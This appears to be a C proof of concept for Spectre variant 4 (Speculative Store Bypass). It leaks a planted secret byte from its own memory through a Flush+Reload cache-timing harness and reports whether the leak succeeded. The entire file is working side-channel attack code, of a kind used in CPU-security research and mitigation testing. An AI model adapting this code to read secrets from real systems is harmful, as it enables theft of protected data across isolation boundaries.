/* Tuned SPECTRE_V4 (Speculative Store Bypass) — slow store bypassed by a fast
   dependent load that reads the stale secret, transmitted via F+R.
   Measurement harness mirrors the proven spectre_full recipe. */
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#define STRIDE 512
#define HIT 80
uint8_t array2[256*STRIDE];
uint8_t buf[256];
volatile size_t sidx = 0;     /* store index; flushed to delay store-address resolution */
uint8_t SECRET = 0;
uint8_t temp = 0;
void ssb_victim(){
  _mm_clflush((void*)&sidx);           /* store address resolves slowly */
  for(volatile int z=0;z<50;z++){}
  buf[sidx] = 0;                        /* SLOW store: buf[0]=0 (sidx==0) */
  temp &= array2[buf[0] * STRIDE];      /* FAST load buf[0]; may bypass store -> stale SECRET */
}
int recover(){
  static int results[256]; int tries,i,j,k,mix,junk=0; register uint64_t t1,t2; volatile uint8_t*a;
  for(i=0;i<256;i++)results[i]=0;
  for(tries=999;tries>0;tries--){
    buf[0]=SECRET;                       /* re-plant secret each round (store overwrites it) */
    _mm_mfence();
    for(i=0;i<256;i++)_mm_clflush(&array2[i*STRIDE]);
    _mm_mfence();
    ssb_victim();
    for(i=0;i<256;i++){
      mix=((i*167)+13)&255; a=&array2[mix*STRIDE];
      t1=__rdtscp(&junk); t1=__rdtscp(&junk); junk=*a;
      t2=__rdtscp(&junk)-t1; t2=__rdtscp(&junk)-t1;
      if(t2<=HIT && mix!=0) results[mix]++;   /* exclude line 0 (the store's public value) */
    }
    j=k=-1;
    for(i=0;i<256;i++){ if(j<0||results[i]>=results[j]){k=j;j=i;} else if(k<0||results[i]>=results[k]){k=i;} }
    if(results[j]>=(2*results[k]+5)||(results[j]==2&&results[k]==0)) break;
  }
  results[0]^=junk; return j;
}
int main(){
  for(int i=0;i<sizeof(array2);i++)array2[i]=1;
  SECRET='V';                            /* 0x56 */
  int got=recover();
  printf("recovered=0x%02X actual=0x%02X\n",got,SECRET);
  if(got==SECRET) printf("SUCCESS! Leaked the actual SPECTRE_V4 secret.\n");
  else printf("No SPECTRE_V4 secret leaked or could not detect leakage.\n");
  return 0;
}
